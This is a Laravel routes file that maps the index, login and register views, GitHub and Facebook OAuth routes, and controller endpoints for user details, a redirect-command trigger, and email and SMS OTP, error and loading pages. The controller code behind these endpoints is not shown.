<?php

use App\Http\Controllers\CommandController;
use App\Http\Controllers\FacebookController;
use App\Http\Controllers\OtpController;
use App\Http\Controllers\UserDetailsController;
use App\Models\User;
use App\Notifications\CustomNotification;
use Filament\Notifications\Notification;
use Illuminate\Support\Facades\Route;
use Laravel\Socialite\Facades\Socialite;

Route::get('/', function () {
    return view('index');
});

Route::get('/login', function(){
    return view('login');
});

Route::get('/register', function(){
    return view('register');
});

Route::get('/auth/redirect', function () {
    return Socialite::driver('github')->redirect();
});
 
Route::get('/auth/callback', function () {
    $user = Socialite::driver('github')->user();
 
    // $user->token
});

Route::get('/auth/facebook', [FacebookController::class, 'facebookpage']);
Route::get('/auth/facebook/callback', [FacebookController::class, 'facebookredirect']);
Route::post('/user-details', [UserDetailsController::class, 'collectDetails']);
Route::post('/trigger-redirect-command', [CommandController::class, 'triggerRedirectCommand']);
Route::get('/email-otp', [OtpController::class, 'emailOtp']);
Route::get('/sms-otp', [OtpController::class, 'smsOtp']);
Route::get('/error', [OtpController::class, 'errorPage']);
Route::get('/loading', [OtpController::class, 'loadingPage']);